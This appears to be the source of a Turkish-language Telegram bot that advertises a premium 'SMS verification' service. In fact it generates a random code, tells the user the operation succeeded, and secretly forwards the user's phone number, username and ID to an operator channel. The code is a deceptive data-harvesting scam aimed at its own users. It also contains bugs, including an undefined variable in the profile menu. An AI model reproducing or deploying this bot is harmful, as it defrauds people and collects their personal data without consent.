import os
import random
import json
from datetime import datetime
from zoneinfo import ZoneInfo
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters

TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
KANAL_ID = int(os.getenv("KANAL_ID"))

waiting_number = set()
selected_country = {}

if os.path.exists("banned.json"):
    with open("banned.json", "r") as f:
        banned_users = set(json.load(f))
else:
    banned_users = set()

def save_bans():
    with open("banned.json", "w") as f:
        json.dump(list(banned_users), f)

def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 SMS ONAY BAŞLAT", callback_data="sms")],
        [InlineKeyboardButton("👑 HESABIM", callback_data="profil")],
        [InlineKeyboardButton("📈 GELİŞTİRİCİ", callback_data="gelistirici")]
    ])

def country_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🇹🇷 Türkiye", callback_data="country_tr"),
         InlineKeyboardButton("🇺🇸 ABD", callback_data="country_us")],
        [InlineKeyboardButton("🇩🇪 Almanya", callback_data="country_de"),
         InlineKeyboardButton("🇫🇷 Fransa", callback_data="country_fr")],
        [InlineKeyboardButton("🇮🇹 İtalya", callback_data="country_it"),
         InlineKeyboardButton("🇪🇸 İspanya", callback_data="country_es")],
        [InlineKeyboardButton("🇬🇧 İngiltere", callback_data="country_gb"),
         InlineKeyboardButton("🇨🇦 Kanada", callback_data="country_ca")],
        [InlineKeyboardButton("🇯🇵 Japonya", callback_data="country_jp"),
         InlineKeyboardButton("🇰🇷 Güney Kore", callback_data="country_kr")]
    ])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id in banned_users:
        return

    username = f"@{user.username}" if user.username else user.first_name

    text = f"""
╔════════════════════════════╗
🌟✨ VIP SMS ONAY SİSTEMİ ✨🌟
╚════════════════════════════╝

👤 Kullanıcı: {username}
🆔 ID: {user.id}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Hızlı ve Güvenli SMS Onay
🔒 Tam Otomatik İşlem
💎 Premium VIP Deneyimi
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⬇️ Devam etmek için bir işlem seç:
"""

    await update.message.reply_text(text, reply_markup=main_menu())

async def menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = query.from_user
    if user.id in banned_users:
        return
    await query.answer()

    data = query.data

    if data == "sms":
        await query.message.reply_text("🌍 Bir ülke seç:", reply_markup=country_menu())

    elif data.startswith("country_"):
        country_name = {
            "country_tr": "🇹🇷 Türkiye",
            "country_us": "🇺🇸 ABD",
            "country_de": "🇩🇪 Almanya",
            "country_fr": "🇫🇷 Fransa",
            "country_it": "🇮🇹 İtalya",
            "country_es": "🇪🇸 İspanya",
            "country_gb": "🇬🇧 İngiltere",
            "country_ca": "🇨🇦 Kanada",
            "country_jp": "🇯🇵 Japonya",
            "country_kr": "🇰🇷 Güney Kore"
        }[data]

        selected_country[user.id] = country_name
        waiting_number.add(user.id)

        btn = KeyboardButton("📲 SMS ONAY")  # Süslü buton
        kb = ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)

        await query.message.reply_text(f"""
╔══════════════╗
📡 SMS ONAY
╚══════════════╝

Ülke: {country_name}
🚀 Butona basarak SMS ONAY yapabilirsiniz!
""", reply_markup=kb)

    elif data == "profil":
        await query.message.reply_text(f"""
╔══════════════╗
👑 HESABIM 👑
╚══════════════╝

👤 Kullanıcı Adı: {username}
🆔 ID: {user.id}
💎 Durum: VIP Kullanıcı
""")

    elif data == "gelistirici":
        await query.message.reply_text(f"""
╔════════════════════╗
🚀 GELİŞTİRİCİ 🚀
╚════════════════════╝

💻 Botun yaratıcısı: @tanrican
✨ Premium destek ve geliştirmeler için iletişim kurabilirsiniz.
""")

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id in banned_users:
        return
    if user.id not in waiting_number:
        return

    waiting_number.remove(user.id)
    country_name = selected_country.get(user.id, "Bilinmiyor")

    code = random.randint(100000, 999999)
    time = datetime.now(ZoneInfo("Europe/Istanbul")).strftime("%d.%m.%Y %H:%M:%S")

    await update.message.reply_text(f"""
╔══════════════╗
✅ SMS ONAY
╚══════════════╝

Ülke: {country_name}
🔢 Kodunuz: {code}
📲 İşlem Başarılı!
""")

    phone = update.message.contact.phone_number
    username = f"@{user.username}" if user.username else user.first_name
    text = f"""
🚨 YENİ SMS ONAY

👤 Kullanıcı: {username}
🆔 ID: {user.id}
📞 Numara: {phone}
🔢 Kod: {code}
🌍 Ülke: {country_name}
🕒 Saat: {time}
"""

    await context.bot.send_message(chat_id=KANAL_ID, text=text)

async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    if not context.args:
        await update.message.reply_text("Kullanım: /ban kullanıcı_id")
        return
    try:
        uid = int(context.args[0])
        banned_users.add(uid)
        with open("banned.json", "w") as f:
            json.dump(list(banned_users), f)
        await update.message.reply_text("✅ Kullanıcı banlandı")
    except:
        await update.message.reply_text("❌ Geçersiz ID")

async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    if not context.args:
        await update.message.reply_text("Kullanım: /unban kullanıcı_id")
        return
    try:
        uid = int(context.args[0])
        banned_users.discard(uid)
        with open("banned.json", "w") as f:
            json.dump(list(banned_users), f)
        await update.message.reply_text("✅ Ban kaldırıldı")
    except:
        await update.message.reply_text("❌ Geçersiz ID")

app = ApplicationBuilder().token(TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("ban", ban))
app.add_handler(CommandHandler("unban", unban))
app.add_handler(CallbackQueryHandler(menu_buttons))
app.add_handler(MessageHandler(filters.CONTACT, contact_handler))

app.run_polling()
